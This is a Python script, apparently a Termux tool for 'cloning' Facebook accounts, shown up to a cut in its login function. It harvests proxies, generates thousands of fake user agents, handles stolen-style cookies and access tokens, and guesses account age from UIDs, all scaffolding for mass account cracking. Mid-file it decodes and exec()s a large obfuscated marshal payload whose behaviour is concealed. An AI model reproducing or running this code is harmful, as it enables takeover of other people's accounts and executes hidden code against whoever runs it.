#-----------------[ IMPORT-MODULE ]-------------------#

def modules():
	print("\x1b[37m [\u001b[36m>\033[1;37m] CHECKING FOR UPDATES \x1b[37m")
	os.system('pkg update -y && pkg upgrade -y')
	os.system('clear')
	try:
		import requests
	except ModuleNotFoundError:
		print("\x1b[37m [\u001b[36m>\033[1;37m] REQUESTS IS BEING INSTALLED \x1b[37m")
		os.system('pip install requests --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m REQUESTS HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\x1b[37m [\u001b[36m>\033[1;37m] BS4 IS BEING INSTALLED \x1b[37m")
		os.system('pip install bs4 --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m BS4 HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	try:
		import rich
	except ModuleNotFoundError:
		print("\x1b[37m [\u001b[36m>\033[1;37m] RICH IS BEING INSTALLED \x1b[37m")
		os.system('pip install rich --quiet')
		print("\x1b[37m \x1b[38;5;196m[\x1b[37m>>\x1b[38;5;196m]\x1b[37m RICH HAS BEEN INSTALLED \x1b[37m")
	except:exit()
	exit()

try:
	import requests as req, re,time,os
	from bs4 import BeautifulSoup as par
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	from bs4 import BeautifulSoup as bs
	from bs4 import BeautifulSoup
	import urllib3,rich,base64
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
	from time import localtime as lt
	pretty.install()
	CON=sol()
except ModuleNotFoundError:
	modules()

#------------------[ GLOBAL VARIABLES ]-------------------#
file_name=[]
ugen2=[]
logincookie=[]
cekap=[]
askc=[]
scp= 'n'
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ualuh=[]


#------------------[ PROXY ]-------------------#

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:pass 
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#
GREEN = '\033[1;92m'
BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
#---------------------[APP]---------------------#              
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'drB6Rlw/UvL9/z6N/L//P83evt/a7vN8X//H8/3nv+15z//fjzf++9/nPX+/O930fm+/fmu//9a//9111/3l5fb4283PIq72//q+D/PKjtof383m+/b4/393q//r4H4r/9S+9/T6//a+/beXl/E///4+/1YKbZ/P+U9p8gEVsj+zSl/RX+kEec0p032EPyCoby4gXy6heMkuqxpLG22zz2gWNmlC/ehxaWhleRWDA95Ly47kJYt2gBGg4IhgLAiwIAgWAoigLMtkB4jV5Duq5RhDAdiX+rJsPxZCPxTHPDynBhHcPphyIzCEpIzqIg8JaIo+ZHohyJ/E8ZR2Wf9Y263v99vpZVuy4++8Mf8OoKP7qLCzxME+NYiZmsp9SEzot0xqP8ot+nnt0j3fA9orHrL+ZuWlBbYbBhv2ss2haXebU+IPHua/21gch/T4VihZm2u1s+18T5xUbpIY4T8/dpBbrg/X/YfBhRqAXbxhQQNkomjxwlnvxgIcK6wcEewCUS6c7nzsXtTj7FXkpGv+erMwlELkq9bA1IzUUDwGCcxdaKWJBUIeWixpw1uJ+ZqmU32m/WXEMCzsuPxCLaDEi4acuUTElEorAY5d29xv3fbQkGtWgJz/T7Pd584WOsrr8z96IPAOvTyYolkulQGQxpvuc3lITau7dAz0jSm77CHAr3a/HU/c672vkVZJjTkdDHFpYJFdbCGfQWfIShMF/nhB9fV6R8Cy7dDBFnmb/8Xw8kf1dAqnuDRLRYFPP3B7qEB6ZKxv8OYd+JqJSUm69pIDe0OJK+1as83QbKfWm0NCTuXONIx+OwmRGpuL6Dh5+Ii7kKgdGKsz44h4ySqNONiGCxo3ysHERUAzBF33qWYTilZ6Njy5WsxJy+IjdkvxhTKxomoH6FKGscMmP7A01gvZT6A2me3eFHw1nde9V2jc4ffxJadQETSTqbh71kNGGoVJj3Im+jxBU4JtPDN2Xsn61GvE0py7ZhU0THnANPwr4cyaOvoWstNKH7Dshm9QfltI0dQoWMnOrqBIspqLNPBCC3He+vs8DvTuOMd3cvjrHNd47TrJ3UbtB5kDD5ET2FvrKXAuM2kT3n6cBmU+9U/kVjdePO8n1RxechC0YoKQ1dayZlnFewc3PAdA4WRK/OefMUjUto8DcLq+acXpXao+8c5qktJuMtxyZwEvSiasSbOnCd36oB3uLwQlQ3sfzRZAy61Wq3gDCqgvR3LG4vk+8F+rpHj7tBVP2EwCtRNXBjjwI9EB9ChQs2deA3M3Y4/NtphSgsgp0D1mxut26fNjYVqJN47/Bjhd27IubzNsnUPGl7SFtTZPgN0L4i7KVZjjRYemEZD4gifRatIqRaLCT1pbIDWKeGUWjHfW4i+L3NBuMfmq4GanoRPrhjDi6AgUPC4B59ASWbGTsZLMC53mRz/3ywd45uzelFWDpPCFX6HqalCdQwwMfphYwIKfaGpoJaGVsqMBPZV828vHNavrU4duIpE7YABKi74H2GK0CmmSkPxdwF6FiNm8wql3KKBj96r1X3x0UCjiAfheLkLsq9FMsRjfZd1n4TbT6CKOHJ3/bVY03V2P2pG54VzSlr++4lqdfKX3tHKIpJyEHwMJLngGcOnicgSuW/zQk3HZsQLq8TTG9f+SLWEJ7iS3Rlelf+hSiQWg0pNBMssBEFdGtHKKF76ZYoWyPJSc+M87sRzZbfQIb2gR4YXy9jcCm4DY3yFR8YHt/q3O3xB6pXTeE1ddbhib/laufoZhLSRivZ4x34HXIhVYyGJ3DqcyvuBJtV8DwvMaLG+ThzUsUaYsDPTBvHbNRnK6MTsiSkb6HzJs28wsE9DaI6p6Ur9+mRsmSjh+7R3NxNmgXqtWKV8PwSk6fgC8xqZwDyDxL1sJNpMjRem0wYgdKWDExxMbeZ2ZWAVWYrHmWt5SD71Lmqh+C2NVkymeWIHhQL61zxpHIE6Wh/ntdXDZ8j9OY/kuH9WHPycutDlU2zanMHyzLGlHhPFTtgR8LAaxu7Xr4XPJ62zxrygvTCl2H6ViFTpyWBok1mJxPG4E1wvQF/QIYMvs9OWgNBAmnAmgn3b4TYOrw16quu6JS2+D2TrIPj3UQYXO0hk9BSvZKoQ/C+N5+IgcMLnN31KLwZV+p2R3R860YO2sMcp77/KHJqmQJIeM7EaIfklC3KmF/VgrUwHEEjAEO5NKwNGGhyG91eAKVp9cI18GvJx2yz0+yvMormlvoT4oo8zxaM0OxkfZHmnxcH8SrW1iLmQxYncqS1WEs8OgelsxLENIzMIc+rikLixWtm1BOhbcFmFHhZRjSkyWyWEMVk382m3Oezs1Xw/sYoBNQo59G2JC0R8VfiUh8UAg/5BKKNTjCVGIOiqg5eWVN019E4cYtjR09/o1i4fbswSYPaWvEAqCE9FLdHLMEbvDs9nh1JgWG5scPxIPe/Dn7yXPIilmhenzvpT8QwNnKNe7MeauLwfMRIuu83M0reVxRcQjoe5JHWKAUEYNEhvmz0rGYqSh6lGnJUW2IbS8pI5y19+l3raUyCq+AnpEMrpGm6FsAZG/fkbSA/mxa5qkPIT7leLi4r6m5KUtA1iJ+3NeI9nFfzulyi4rjniFnV/ZUZpTf6iejuFc4ggRzjfq0He+a1SxL9dTpFEqIiqakLkyO2IX67JT8ElOF8kU7ZMz4clXzRARIyXJBL37n6lY4WfqGjWIzWyZmQU7PtNH7+Cyhzii/Y6XvQW4a2PrPDlnGR/Qg+p3E9hWd25NAi9epZkReD2Nds/1EWIRqyAQxgNIxEANBzjBRqFXrbAYjj10iLNCh1E98bwwnS4pWbxGYNPynMAKc+zCrpH9cDPT9fAey/3EYe59nZzVNMFNPpaAJGXXfq9zqBZSErYYVg2YxxmRxiX75r2prAWXnP5NQBf0KSLyauAEefs3tlndfdBmhwrXvZuMu7Ca4yfkVTqm2AW2EfqWcDe2REWq+OtqbDhI3P2P+pYN4pLSoseZC1PRbQySXLh9H/NRA9kAhCBVnu21RH/16r4EYCuPuqbFOcPW+hgFv6miN0FtE3nu2rcebeqtv1eFMDSA73LrK0BK1Odor8RGwJSelX/w+Z8Qv9YyLiPlm2RL0TzBRuLEYbSCGBsaCyYHmlGYf8TT3A2FBi1r64LuYOc+3voYJc/dVofobvz4brxOzEDhd5jKwDCGemC6wDkn52J695nDITiNIazrjSTstgQFBosksDR0g3J1fvt93JOsT/+XiDeGBgmwMIiJVV55DJU/diuGWiskcPLB9Y6tWmzWSGfBUh99Xz3Y9qOa26o//dCIDVvnbC/wLa+GKdUCBZDPgb+krUy3bkjfPmXNePVN4GJYYkxelODYH+qy0Mv+8IesjlW7Kx/RW6luF4p1mN9YwC0Gq3+pIwg33wcnfpfbOtWcS8ZSbJ3QYVcbSe13W6SXDOqhmPqvoAtRE7XUpNIld6N0jysaWmyhWwBII7y5nBQ1MrazNMnfOeQfL23MJ4D3pNPq1Y8lnQsZzN4r5HnW5+OS6zdtQQN/D6dECLUk/IjdxoxPBEHI2OO9Aqy0iaAlZ2TYP9yVnCdTwye8yjkLuHJHzCS/OBhfu2D1yuO7Orn8NkPxQ1Kf/94EptJDcHxxgvWMaxNoMWxYgGqhPS2jOP/uVDeFVBTwA4u+jZ2scmXvNC/oIK0ElwjFteKIif5f0cUT4/BtO53wNsTQ7QOr98wWgd7nMv7H1nkYLBmSd+Iqw6XHEbwoJIVCgUZ9pB+eMzDyb1uzhqlwRuVIaUaTKWYV4D5TKN3Km58Gb0BNM50qs38cuiN8Z1Ko5hsh3PtMGxh5+flUks4msqe6UPbsHaUYsyn5NEwUQA5gS3HJe+EEyqwnnuuLRTb+Y4ycKq1tcz6lAnsCFedzYM52IE1X6epNVKDElLhPLr6SzlvuQ7PiPdtq3tWk5qWLV4HACchENv1FtCdhX7eM3mt/bT3kyGQkXn/Hk9fZ4skqtECh28dODInUREuiVWt+yq5g9+G9vDSZ+olFdNvPHDM4imzw980jnpqDeAyHyhZuwbkKEYtsaCwTG4HTFCTMIyI3YdFfdcuEZX7Y16NcSleaVxngKDRjNNLTuVQPQsTQFt5r33EYOdMQm260l3P+MKtfW9a3gQL5Q1PAvfjMTTj1HJ9AYIQ4WQJMIIdeEnZ/3H0YWBGt99I9U0SnxUPC/pGux5t2sVlc4nE1O2JmcRUSH1SK9FzLMHLvU21VS9mHEvv0Aj8Okyg4XfXP6Qz6GLj46+5pPIdWrEQqUMUl88DNx/ehnNjIgvKDPSz8jGcnYY2pK9jtMVvW8nFiDwRL6Z5IDb/KTZDpmVCniun+FD0Rt1DjwYdMTVx/ktgtzY6STuyW71tHzjIF7hc8SRmMxH6sdroUqbsIXh2rMdbnPxPBSRB2TaCu4Q/qRecfl7a9bY65fuJHtEPsgVDWu+ffnBmhrTmyMoFlr4y4QdvOX3ei/mxDf1Tx9fWY7z+BIHjs04xJoV0YDETVsNOLRatnhp0EmPhLKddb1SZDkPRv2u3coz3ZdGz8MqxKRTDsxn1KE5ClKUN6TZ14Z83SZoiHGqPTtBBMIhKbsA2nictBus91jl+GbUoUwKoExe6Um9wSzy1OCuekGmZ6Ga47E7i9JqbR9q0w66HgGui7w+zUW5UIwI5B7BMP7Oydxj+qaK6298mPnZ/wyV05Z2/WMHG86EjALFj/z5bpUfVcy5U2YxYOlniHNa9IMnMwoIjqBbvILpnzd/VkZ13n9fOLRgdu6U39v7mVXNwSVpFhWPT5vhQ+fWFNpcRRKm04phYHTrQA3+xXX6wi8rgyug58YuC4R1e6H66LtKoRxWWuGVqe2dPYZuhQ7HAGNRe0H3dFFTPis+CQIB+6T2mlu+mIiVyBRnte/CptARjflXYcveO7yjbCcPF2JbPr5w4+yVWdBj46qWhkEITHM3VOhM5CjcOAegOA3OeMIysdPJED8HmNOAOLvaThgjKUE19OeNNDkarQ+LgfRDOAG+4jT5IsqwTp7hEyYvdLfxBVO7/5ragoy9vHbMs6x/TFs78A102syT9mOOi07tFQxbvrnzVDXfxAxZ90rO2LDyxowLmveeguFZrRArN9cWGB8NCI5ZYfz6VN/2bsGIPZtdZcdlSyb4s7LhWLpruUHWqOVapBTcXjqqyHAb48ByO3dcx1vFVTZW2Z/CVYVczmruJNeSGw45qRYO1LPb6qe2ldAM2sGsIG9tw2obHcNy0qV2wH8oBQdhCSthOkH43fdCI0uhdZto/6Wq8E6xzoMRllR402aX+7OS5gaAasK0oTtKbk7yogg74GV6HlpUxMPqhZQ6LFZD4VHTK8xn26xr6t1UJHjaMFbsDtFYH0ch4AvtIQcSCfqsfUREwbwxfmce/b2zyeHDanMropncPqZSqhFQSV3uYb425D3kz6igiN4YA5d8ixwT38xXt4lfmHJPmIDK99oxvx/+hUGH/VaB0+Jiw3ZsL1+KhuerG3lbr4H6XIE6IrMeN26nXvJq/nBGA4o77PRyF+dkTjyYmMHZYSyzNCMGpZgaU+NjuPWsVyvNZneUcmx4CZF5yYb2ypc8HYLOjNLnKszsc3Q8FkfH4AAsrgMWyN1ze/U1BR+tXM0mWJN1wGHsyn1R5CwnH4Vcq3bdm50JgUNPDoiizfCdZuA3uMzE+3sN/wdno8TyFRV5SpZVFQ7XcHOfOaesEFpA7yw2qP33ir4086A0wJaKPCc4wSvOcJqZm+b1nJ4Ln4StPIPrQejKHvB3N3ERjPWhZacIymqMeMWfV0WDYg14jarEMA+WfSlcXWyNzyfCd2uAKcjpAWI1wu30+VS6Frnkki+SkPwSS5zfTIkAJsxoeDyE0OIBKrEzKuqcIGIcshzTl4+/s5Ef3PENQrCsirN5BbAH6mPRnSlgolNwSsMuzTGKQIx3TwR/gTUZeOsAxqgctx+abAZRVuPePuBzwhqnJgIIlD93JvRc1EnVCtO9KXcX0448BrbKbVomA4ROuRLnLB3cjie0+laFN0qBt+pUtR8RrKQPfJPBQ70t7N6UYx7zB1u1ntu4tBj7acyKj0inxMryRlVD1rDR/TF4zPXyqeGXZrYJfaGkUcriskCMLY7HNFN98o924wmVb27otaMGuc8/8AvJlXPp4VKPTC6Y4ciMNvIiazdmvJCQRWdwjhgX7qBKnPeyvlVNGydmqUeXfVkDq0K8yNjLtDQbH1BLPLWD7tZmDVVyY8qXt0ICakfBsrqCroeKPsHkJHFmtiogPwxf23XZGiDeLn99lr7er3URGjhn37FnsYIYNOjP+jdjEqEEMSeQrartA9vIHKtJg5QVsVXvH/v/6kV4hOw5MNdXGC2LOug93ow1fkTXUBddxaLgJBurW4eyxsRMG67DkmjA6587tMeSuOySw5tNokOekmu5xFPHjDQi6TnL+9VWnDYxSavPJK+hN+7+FlWyeLuOqjk+siqxQQzXNARkG7JGStfTrLSYzb9Nw7raONDmYpeiLEqa0NMcWU5XUirAWODiSdjT2wonSOTl6ETmctiKaaZxnQpD8EG+mcMr0SPVRiTqBU7mDYX5bCJzhxp03fTavYdD+gKHxNBDvjzRIcq/aYUq6cTlGj1NJKNJUR+OELf4YmKul8YX+Wf0W1zYBJ4SgsKamW7H9QsbTm273k73v9V5lWAqrzno3EMsyyIO3VpXAX9ct/OENVf4d0LmWaYKx05btLzDkwnfta78SCxkNUrIZPOLIgh2gwnhopMvJwhYqdVnfTRw6tzijv+Muqd78rptPYNkAnBI2AiBj9+R1mOKQZkhsPZJF9sMv784YPVDG6xVxzZbCFdq8DlNyL66+8GkbtaA9MpLCeXk16HGIFMAJiCpdRkcF/vL/0lX+KdZPA/dXHZ0KQK5PilkZB/c1UYBAtGJUcG/nm7FuweKcUxO+9A/zFCSJtPHV/V3FVD4ClSXUQGhQJlHS89SBoL18b22NxywLY/+x6Zh94TCHhZAF+m2WFkZ6tlIa41UraJ6jrjnbuD3DUm24KGgC3mHjjuKn7W87G3S+pDI6jHZxez80nXOU8NTSzJmU4mUGL1+xPDMR0CX09A5yPRkHxvriWAFUu7mFrymtAAgiMOSy4rrTJWDRFpuA4y4Y9T0Sa2BUpDTop7ZjCKGV2ET+JIF7aWmOu9EkNytX0GEFTlbql9th6JTKunk805dko5TbveS0zRwaMLe0oAqPwyZ7QQ1kCPjvengYEU+cAbTcbtNJqilTYrwHf7F/WXS3m1LlKKmbycykGxr6TbE6uJMuQxIjlD67SNwTCi3zIZFMAk1YEVXbcfqhtofQDXdp9wDsgzlTG3YU9IMg66AU+FmBWg0dFw8NmTm/5Mt1OuTwsBZFE209TIuSkethmc4SdfdKW7+hf0XMaiFi5uTTJdvvsqONngHVJgiGiHjRjTYci7WbcU74QvzCYvKHucXSHF8ZIrruvan7XaUB4LHAwQKhQoDMX1mutrG+829YQz1hKRdCwOHdVMVlQ/pXqs8gbf598l7IUm3r4D7lEVTZWxjmAzTfa+vC1byxYWhoXDK0H6kCH8qXExt0EfMi7A8ZDQ4LrdHWCC0YnMupe+ZBSc1EXdf9itzCrQk/lU9cKuCJtgpYPIfNQSFzrGfsEJrAKRQKTYwWwrtypf9NU6SKaebOpTP0av3LNlrIyaAkyRblbhFJMC8WuaJxa+/Ot1Js3fOUC30NiCegiJlrZcbxm8CDBXGhuZgMCRuhfXaOuQyCL+oQjpVvRyywbGkN1qlHMUOZbA4qJDN2KTFFYZsJX6N8UhkYfsIh7xMLrGxjldOhZ7joTnf8KZ16QVzV5D0BgrHoyYsKEon4SBzUDqJ5p23VnyQVQWv+QEVtvG1xOw7UhjfeqnIyYU3Wsdv+9COY5faFOqZFqhMzGiJrZcpK/gAq1wvg5JPUPYVCSZZGuHakRB3OscCvXJOW/cH6x2XSFAwU0fCeWTuXeph0IBMZE0KydVFizkPyEqmlfM7/CKYRRJhGJmWfZIvaD5kmRqYGhAuRoHd4wuaPbaLjxyeU8/hLvTU4/UlibZVQ7zKCfeniRTqSSEt3Uk3pNWLocTeB9k5kfM9tGxMhfIOo3kF4+ynqICu9z0Odrq9VErDVYYHX2rDHwmBvnPhkODRuxpikXJgGCKLo0vj1dFHnn8tCf3VlRgufzpRKe8dR3ksah1jItkIJNkm6gliZ/gT0mmk1sVu+qpLZ+M0qSp7pIIjFvGzfUKFueGmcNLA1Mj1ZvXSaPG2iYf/jCbDlbFNaL7QQY6DoK1V7xUuXcrEWbPfpbHf36K7oaIFqB/uFMBfd36tp8rK++oZfS1NdgQUPC4v0W051kVpAvRkzAFdARpL67pg+761WZ0Gj5Zo0grt4XQ01DYX2haeGdQy9Vkb3YGc2S7oC6NdwgXkc+7wZfYGql8BQGp8TunfgUAbggBPlWHEQc/q7pfTvgNcgAEAKkIAiQKU1gHB2A6wjHyL9UwAhVIsjlCQFg4xgrBgunIsir4CyENC+ADCKAli0RBBqAFMKVEM77oLYBAU+URBYAgEYiE3cUPMYekTFAnFKmwMAC5ohcWHl43zRUXd///+85w//2/z2fbz//y5fK9/3e/6/wf6/vX6/f/8a8//ji/++3l/zjz7/fm/9x+/F+3//d9r3/z//OTMv1zedtqqJlLRLokmgAO1nS8wI4cWgz8QxNmwgDk3lzN+tUv2XQm8uv6XJIbPgviiA1Iv6kY85f+dv33yN9KksutxJe'))
#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/sand1pey')
	back()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    

#------------------[ LOGO-LAKNAT ]-----------------#

logo=("""\x1b[37m   _____                 ___                 
  / ___/____ _____  ____/ (_)___  ___  __  __
  \__ \/ __ `/ __ \/ __  / / __ \/ _ \/ / / /
 ___/ / /_/ / / / / /_/ / / /_/ /  __/ /_/ / 
/____/\__,_/_/ /_/\__,_/_/ .___/\___/\__, /  
                        /_/         /____/\033[1;36m2.8 \033[1;37m   """)
def info():
	print(f"""--------------------------------------------
 OWNER     : SANDIP GURUNG
 GITHUB    : SANDIP-GURUNG
 FACEBOOK  : SANDIP GHOTANEY GURUNG
\033[1;37m----------------------------------------------""")
def banner():
	print(logo)

#---------------------[UID]---------------------#
def saurabh(id):
	if len(id)==15:
		if id[:10] in ['1000000000']       :saurav = '2009'
		elif id[:9] in ['100000000']       :saurav = '2009'
		elif id[:8] in ['10000000']        :saurav = '2009'
		elif id[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:saurav = '2009'
		elif id[:7] in ['1000006','1000007','1000008','1000009']:saurav = '2010'
		elif id[:6] in ['100001']          :saurav = '2010'
		elif id[:6] in ['100002','100003'] :saurav = '2011'
		elif id[:6] in ['100004']          :saurav = '2012'
		elif id[:6] in ['100005','100006'] :saurav = '2013'
		elif id[:6] in ['100007','100008'] :saurav = '2014'
		elif id[:6] in ['100009']          :saurav = '2015'
		elif id[:5] in ['10001']           :saurav = '2016'
		elif id[:5] in ['10002']           :saurav = '2017'
		elif id[:5] in ['10003']           :saurav = '2018'
		elif id[:5] in ['10004']           :saurav = '2019'
		elif id[:5] in ['10005']           :saurav = '2020'
		elif id[:5] in ['10008']           :saurav = '2022'
		elif id[:5] in ['10009']           :saurav = '2023'
		elif id[:5] in ['10007','10006']:saurav = '2021'
		else:saurav=''
	elif len(id) in [9,10]:
		saurav = '2008'
	elif len(id)==8:
		saurav = '2007'
	elif len(id)==14:
		saurav = '2023'			
	elif len(id)==7:
		saurav = '2006'
	else:saurav=''
	return saurav
#------------------[ GREETINGS ]-----------------#

current_time = datetime.datetime.now()
current_hour = current_time.hour
if 5 <= current_hour < 12:
    greeting = "GOOD MORNING   : "
elif 12 <= current_hour < 17:
    greeting = "GOOD AFTERNOON : "
elif 17 <= current_hour < 20:
    greeting = "GOOD EVENING   : "
else:
    greeting = "GOOD NIGHT     : "

#------------------[ NAME AND PSW ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
try:open("data/password.xml", "r")
except FileNotFoundError:
    open("data/password.xml", "w")
    pass
def namepsw():
    os.system('clear')
    banner()
    info()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" [\u001b[36m>\033[1;37m] ENTER YOUR REAL NAME")
        linex()
        uname = input(" [\u001b[36m>\033[1;37m] ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        with open("data/password.xml", "r") as password_file_obj:
            upass = password_file_obj.readline().strip()
    else:
        print(" [\u001b[36m>\033[1;37m] ADD A PSW TO YOUT ACCOUNT")
        linex()
        upass = input(" [\u001b[36m>\033[1;37m] ENTER YOUR PASSWORD : ")
        linex()
        with open("data/password.xml", "w") as password_file_obj:
            password_file_obj.write(upass)
    animation(" [\u001b[36m>\033[1;37m] YOUR DETAILS HAS BEEN CHANGED ")
    restart()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    with open('data/password.xml', 'r') as password_file:
        upass = password_file.readline().strip()
    if len(uname) > 1 and len(upass) > 1:
        pass
    else:
        namepsw()
except FileNotFoundError:
    namepsw()
except IOError:
    namepsw()
    
def passask():
    with open('data/password.xml', 'r') as file:
        stored_password = file.read().strip()
    linex()
    user_password = input(" [\u001b[36m>\033[1;37m] ENTER THE PASSWORD : ")
    if user_password == stored_password:
        pass
    else:
        linex()
        animation(" \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m ACCESS DENIED !")
        restart()

#--------------------[ LOGIN ]--------------#

def login123():
	os.system('clear')
	banner()
	info()
	print(""" [\u001b[36m1\033[1;37m] \033[1;37mCOOKIE LOGIN""")
	print(""" [\u001b[36m2\033[1;37m] \033[1;37mFILE CLONING  """)
	print(""" [\u001b[36m3\033[1;37m] \033[1;37mJOIN MESSAGER GC """)
	linex()
	lgmt = input(' CHOOSE : ')
	if lgmt == '1':
		login_lagi334()
	elif lgmt == '2':
		fileopt()
	elif lgmt == '3':
		groups()
	else:
		linex()
		animation(' \x1b[38;5;196m[\x1b[37m×\x1b[38;5;196m]\x1b[37m OPTION NOT FOUND')
		restart()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
